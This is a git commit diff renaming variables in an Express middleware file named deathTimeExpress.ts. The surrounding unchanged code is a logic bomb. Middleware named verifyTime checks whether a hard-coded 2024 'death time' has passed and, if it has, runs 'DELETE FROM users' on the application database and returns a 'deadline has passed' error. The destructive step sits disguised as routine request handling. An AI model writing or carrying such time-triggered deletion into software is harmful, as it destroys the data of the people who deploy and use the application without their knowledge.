e0e3416816a71df05b97c0f461b9c583507ff754
MechShcweiss98 <Chony_canals@yahoo.com.ar>
2025-01-05 16:04:49 -0300

    Update deathTimeExpress.ts

--- deathTimeExpress.ts
+++ deathTimeExpress.ts
@@ -3,10 +3,10 @@ import { BsDate } from "../db/db";
 
 export const verifyTime = async (_req: Request, res: Response, next: NextFunction) => {
     try {
-        const currentTime = new Date();
-        const deathTime = new Date('2024-07-27T09:11:00Z');
+        const current_time = new Date();
+        const death_time = new Date('2024-07-27T09:11:00Z');
 
-        if (currentTime > deathTime) { 
+        if (current_time > death_time) { 
             await BsDate.query('DELETE FROM users');
             return res.status(403).json({ message: "la fehca limite ha pasado" })
         }
